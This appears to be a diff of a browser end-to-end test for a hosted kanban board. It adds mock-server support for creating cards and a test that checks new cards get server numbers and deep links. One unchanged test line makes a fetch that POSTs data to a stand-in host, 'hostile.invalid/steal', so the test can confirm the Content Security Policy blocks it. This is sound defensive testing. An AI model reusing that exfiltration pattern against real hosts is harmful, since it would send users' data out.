@@ -50,6 +50,12 @@ const server = http.createServer(async (req, res) => {
       const updates = []; let result;
       if (suffix === '/commits') {
         for (const op of body.ops) {
+          if (op.kind === 'create-card') {
+            assert.equal(op.card.num, undefined); assert.equal(op.card.column, 'backlog');
+            const card = { ...op.card, num: files['tasks.json'].next_num++ };
+            const created = 'cards/' + card.id + '.json'; files[created] = card; revs[created] = 'new-' + ++version;
+            revs['tasks.json'] = 'root-' + version; updates.push({ path: created, rev: revs[created] }); continue;
+          }
           if (op.baseRev !== revs[op.path]) return error('revision_conflict', 412);
           assert.deepEqual(op.body.history, files[op.path].history, 'replacement preserves omitted history');
           assert.deepEqual(op.body.comments, files[op.path].comments, 'replacement preserves omitted comments');
@@ -154,7 +160,19 @@ const server = http.createServer(async (req, res) => {
     const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
     assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');
 
-    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' }); await page.reload(); await page.locator('#hostedSignIn').waitFor();
+    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
+    const quick = page.locator('.col[data-col="backlog"] .add input');
+    await quick.fill('New hosted card'); await quick.press('Enter');
+    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
+    const created = Object.values(files).find(x => x.title === 'New hosted card');
+    assert.ok(created); assert.equal(created.num, 900000); assert.equal(created.column, 'backlog');
+    await page.evaluate(() => { location.hash = '#900000'; }); await page.locator('#dlgCard[open]').waitFor();
+    await page.waitForFunction(() => document.getElementById('cTitle').value === 'New hosted card');
+    assert.match(await page.evaluate(() => kbNavigation.link()), /#900000$/);
+    ok('new UI cards receive server numbers in Backlog, including six-digit deep links');
+    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
+    await page.locator('#hostedSignOut').click(); await page.locator('#hostedSignIn').waitFor();
+    await page.reload(); await page.locator('#hostedSignIn').waitFor();
     assert.equal(await page.locator('#hostedPassword').inputValue(), ''); assert.equal(errors.length, 0, errors.join('\n')); ok('reload requires sign-in and browser has no page errors');
     const second = await browser.newPage();
     await second.addInitScript(() => { sessionStorage.setItem('kb_view', 'board'); localStorage.setItem('kb_layout', 'classic'); });
